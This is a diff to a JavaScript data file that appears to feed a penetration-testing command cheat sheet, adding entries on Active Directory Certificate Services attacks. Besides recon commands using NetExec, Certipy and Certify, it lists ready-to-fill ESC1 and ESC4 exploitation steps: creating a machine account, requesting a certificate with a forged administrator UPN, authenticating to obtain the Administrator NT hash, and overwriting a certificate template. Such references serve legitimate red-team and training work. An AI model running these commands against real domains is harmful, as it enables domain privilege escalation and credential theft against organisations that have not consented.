@@ -1851,5 +1851,77 @@ var data = [
         "category":"PIVOTING",
         "information": "SSH - port forwarding",
         "command": "ssh -L [local_port]:[remote_ip]:[remote_port] [user]@[ip]",
+    },
+    {
+        "id": 247,
+        "tool": "NetExec",
+        "category":"RECON",
+        "information": "Find PKI in Active Directory and Certificate Templates Names",
+        "command": "nxc ldap [ip] -u [username] -p [password] -M adcs",
+        "link": "https://github.com/Pennyw0rth/NetExec"
+    },
+    {
+        "id": 248,
+        "tool": "Certipy",
+        "category": "RECON",
+        "information": "Search for vulnerable certificate templates",
+        "command": "certipy find -u [username] -p [password] -dc-ip [dc_ip] -vulnerable -enabled",
+        "link": "https://github.com/ly4k/Certipy"
+    },
+    {
+        "id": 249,
+        "tool": "Certipy",
+        "category": "RECON",
+        "information": "List CAs, servers and search for vulnerable certificate templates",
+        "command": "certipy find -u [username] -p [password] -dc-ip [ip] -dns-tcp -ns [ip] -debug",
+        "link": "https://github.com/ly4k/Certipy"
+    },
+    {
+        "id": 250,
+        "tool": "Certify",
+        "category": "RECON",
+        "information": "Search for vulnerable certificate templates",
+        "command": "certify.exe find /vulnerable",
+        "link": "https://github.com/GhostPack/Certify"
+    },
+    {
+        "id": 251,
+        "tool": "impacket",
+        "category": "ATTACK/EXPLOIT",
+        "information": "AD ESC1 - Create a new machine account with active directory",
+        "command": "impacket-addcomputer [domain]/[username]:[password] -computer-name [computer_name] -computer-pass [computer_password]",
+        "link": "https://github.com/fortra/impacket"
+    },
+    {
+        "id": 252,
+        "tool": "Certipy",
+        "category": "ATTACK/EXPLOIT",
+        "information": "AD ESC1 - Use ability to enroll as a normal user & provide a user defined Subject Alternative Name (SAN) with Active Directory",
+        "command": "certipy req -u [computer_name] -p [computer_password] -ca [ca] -target [domain] -template [template] -upn [username]@[domain] -dns [domain] -dc-ip [ip]",
+        "link": "https://github.com/ly4k/Certipy"
+    },
+    {
+        "id": 253,
+        "tool": "Certipy",
+        "category": "ATTACK/EXPLOIT",
+        "information": "AD ESC1 - Authenticate with the certificate and get the NT hash of the Administrator in Active Directory",
+        "command": "certipy auth -pfx [pfx_file] -domain [domain] -username [username] -dc-ip [ip]",
+        "link": "https://github.com/ly4k/Certipy"
+    },
+    {
+        "id": 254,
+        "tool": "Certipy",
+        "category": "ATTACK/EXPLOIT",
+        "information": "AD ESC4 - Overwrite the configuration to make it vulnerable to ESC1",
+        "command": "certipy template -username [username] -password [password] -template [template] -save-old -dc-ip [ip]",
+        "link": "https://github.com/ly4k/Certipy"
+    },
+    {
+        "id": 255,
+        "tool": "Certipy",
+        "category": "ATTACK/EXPLOIT",
+        "information": "AD ESC4 - Verify if the certificate is vulnerable to ESC1",
+        "command": "certipy find -u [username] -p [password] -dc-ip [ip] -dns-tcp -ns [ip] -stdout -debug",
+        "link": "https://github.com/ly4k/Certipy"
     }
 ]
